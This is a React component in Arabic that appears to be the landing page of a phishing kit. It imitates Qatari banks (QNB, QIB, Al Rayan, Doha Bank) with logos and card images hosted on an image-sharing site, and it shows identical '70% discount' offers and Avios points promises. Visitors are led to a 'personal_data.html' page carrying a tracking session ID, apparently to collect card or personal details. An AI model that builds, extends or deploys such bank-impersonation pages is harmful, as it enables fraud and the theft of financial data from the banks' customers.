import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { nanoid } from "nanoid";

const bankImages = {
  all: "https://i.ibb.co/7dyy1yyv/IMG-20260710-WA0008.jpg",
  qnb: "https://i.ibb.co/7dyy1yyv/IMG-20260710-WA0008.jpg",
  qib: "https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg",
  rayan: "https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg",
  doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
};

const cards = [
  { bank: "qnb", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://i.ibb.co/hxhwkMwt/IMG-20260714-WA0003.jpg" },
  { bank: "qnb", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://i.ibb.co/ZRp4ZFQz/IMG-20260714-WA0002.jpg" },
  { bank: "qnb", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://i.ibb.co/zVfXCPrs/IMG-20260714-WA0004.jpg" },
  { bank: "qib", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", img: "https://i.ibb.co/BDhRQrT/IMG-20260714-WA0005.jpg" },
  { bank: "qib", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", img: "https://i.ibb.co/PGg2Bw30/IMG-20260714-WA0006.jpg" },
  { bank: "qib", logo: "https://i.ibb.co/7NQ43XdK/IMG-20260714-WA0011.jpg", img: "https://i.ibb.co/0Rg7qXHv/IMG-20260714-WA0007.jpg" },
  { bank: "rayan", logo: "https://i.ibb.co/KzSyQBRw/IMG-20260714-WA0010.jpg", img: "https://i.ibb.co/99tzZcZJ/IMG-20260714-WA0001.jpg" },
  { bank: "rayan", logo: "https://i.ibb.co/KzSyQBRw/IMG-20260714-WA0010.jpg", img: "https://i.ibb.co/tpKx6xLM/IMG-20260714-WA0000.jpg" },
  { bank: "doha", logo: "https://i.ibb.co/Df4dHNFh/IMG-20260714-WA0013.jpg", img: "https://i.ibb.co/RpGjpb8W/doha-bank-black-card-384x241.jpg" },
  { bank: "doha", logo: "https://i.ibb.co/Df4dHNFh/IMG-20260714-WA0013.jpg", img: "https://i.ibb.co/TMCDtHS7/doha-bank-burgundy-card-384x241-1.jpg" },
];

export default function Home() {
  const [, setLocation] = useLocation();
  const [bankSelect, setBankSelect] = useState("all");
  const [mainCardImage, setMainCardImage] = useState(bankImages.all as string);
  const [currentSlide, setCurrentSlide] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % 2);
    }, 3000);
    return () => clearInterval(timer);
  }, []);

  const updatePage = (bankType: string) => {
    setBankSelect(bankType);
    setMainCardImage(bankImages[bankType as keyof typeof bankImages]);
  };

  const goToPersonalData = () => {
    const selectedBank = bankSelect;
    if (selectedBank !== "all") {
      const sessionId = nanoid();
      localStorage.setItem("sessionId", sessionId);
      localStorage.setItem("selectedBank", selectedBank);
      setLocation(`/personal_data.html?bank=${selectedBank}&session=${sessionId}`);
    } else {
      alert("يرجى اختيار البنك أولاً");
    }
  };

  const handleCardClick = (bank: string) => {
    const sessionId = nanoid();
    localStorage.setItem("sessionId", sessionId);
    localStorage.setItem("selectedBank", bank);
    setLocation(`/personal_data.html?bank=${bank}&session=${sessionId}`);
  };

  const filteredCards = bankSelect === "all" ? cards : cards.filter((c) => c.bank === bankSelect);

  return (
    <html lang="ar" dir="rtl">
      <head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <style>{`
          body { margin: 0; padding: 0; font-family: sans-serif; background-color: #f4f4f4; }
          .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 1px solid #ddd; }
          .header-right { display: flex; align-items: center; gap: 15px; }
          .menu-icon { font-size: 28px; cursor: pointer; color: #8C0032; }
          .logo { height: 40px; width: auto; object-fit: contain; }
          .header-left { display: flex; align-items: center; }
          .lang-btn { background-color: transparent; color: #4a004e; border: 2px solid #4a004e; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
          
          .slider-container { width: 100%; height: 50vh; overflow: hidden; position: relative; }
          .slider-container img { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; opacity: 0; transition: opacity 1s; }
          .slider-container img.active { opacity: 1; }

          .dropdown-container { margin: 10px; }
          .dropdown-select { width: 100%; padding: 15px; border-radius: 5px; border: 1px solid #ddd; font-size: 16px; cursor: pointer; background: white; }

          .card-content-wrapper { padding: 0 10px 20px 10px; text-align: center; }
          .card-image { width: 100%; border-radius: 10px; display: block; margin-bottom: 15px; }
          .apply-btn-main { background: #8C0032; color: white; padding: 15px 40px; border: none; border-radius: 5px; font-weight: bold; margin-top: 15px; cursor: pointer; display: block; width: 100%; }

          .cards-container { padding: 0 10px 20px 10px; }
          .qnb-card-box { background-color: #ffffff; border-radius: 15px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; }
          .bank-logo { height: 60px; margin-bottom: 15px; }
          .card-image-qnb { width: 100%; max-width: 300px; margin-bottom: 15px; border-radius: 8px; }
          
          .grid-container { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 15px 0; }
          .feature-box { background: #fdfdfd; padding: 10px; border-radius: 8px; border: 1px solid #e0e0e0; text-align: center; }
          .feature-box h4 { margin: 5px 0; font-size: 13px; color: #333; }
          .feature-box p { color: #8C0032; font-weight: bold; margin: 0; font-size: 14px; }
          
          .bottom-features { display: flex; justify-content: space-around; padding: 15px; background: #8C0032; color: white; border-radius: 10px; margin-bottom: 15px; font-size: 11px; text-align: center; }
          .apply-btn { background-color: #8C0032; color: #ffffff; padding: 12px 0; width: 100%; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; cursor: pointer; }
          
          .footer-image { width: 100%; display: block; margin-top: 20px; object-fit: cover; }
        `}</style>
      </head>
      <body>
        <header className="header">
          <div className="header-right">
            <div className="menu-icon">&#9776;</div>
            <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" alt="logo" />
          </div>
          <div className="header-left">
            <a href="index_en.html" className="lang-btn" style={{ textDecoration: "none" }}>
              English
            </a>
          </div>
        </header>

        <div className="slider-container">
          <img
            src="https://i.ibb.co/0RwDLqXq/h2-visa-cug-china.jpg"
            className={currentSlide === 0 ? "active" : ""}
            alt="Slide 1"
          />
          <img
            src="https://i.ibb.co/mCKNbdgW/PHL.jpg"
            className={currentSlide === 1 ? "active" : ""}
            alt="Slide 2"
          />
        </div>

        <div className="dropdown-container">
          <select className="dropdown-select" value={bankSelect} onChange={(e) => updatePage(e.target.value)}>
            <option value="all">اختر بنكك</option>
            <option value="qnb">بنك قطر الوطني (QNB)</option>
            <option value="qib">مصرف قطر الإسلامي (QIB)</option>
            <option value="rayan">مصرف الريان</option>
            <option value="doha">بنك الدوحة</option>
          </select>
        </div>

        <div className="card-content-wrapper">
          <img src={mainCardImage} className="card-image" alt="Card Image" />
          <h2>أضف بطاقة الدفع لحسابك</h2>
          <p>أضف بطاقات الدفع من نوع Visa و Mastercard لحساب عضويتك واجمع نقاط أفيوس.</p>
          <button className="apply-btn-main" onClick={goToPersonalData}>
            ابدأ الآن
          </button>
        </div>

        <div className="cards-container">
          {filteredCards.map((card, idx) => (
            <div key={idx} className="qnb-card-box">
              <img src={card.logo} className="bank-logo" alt="Bank Logo" />
              <img src={card.img} className="card-image-qnb" alt="Credit Card" />
              <div className="grid-container">
                <div className="feature-box">
                  <h4>تأجير السيارات</h4>
                  <p>خصم 70%</p>
                </div>
                <div className="feature-box">
                  <h4>حجوزات الفنادق</h4>
                  <p>خصم 70%</p>
                </div>
                <div className="feature-box">
                  <h4>تذاكر الطيران</h4>
                  <p>خصم 70%</p>
                </div>
                <div className="feature-box">
                  <h4>المواقف</h4>
                  <p>خصم 70%</p>
                </div>
              </div>
              <div className="bottom-features">
                <div>مزايا حصرية</div>
                <div>دفع آمن</div>
                <div>تقبل عالمياً</div>
              </div>
              <button className="apply-btn" onClick={() => handleCardClick(card.bank)}>
                اطلبها الآن
              </button>
            </div>
          ))}
        </div>

        <img src="https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" className="footer-image" alt="Footer" />
      </body>
    </html>
  );
}
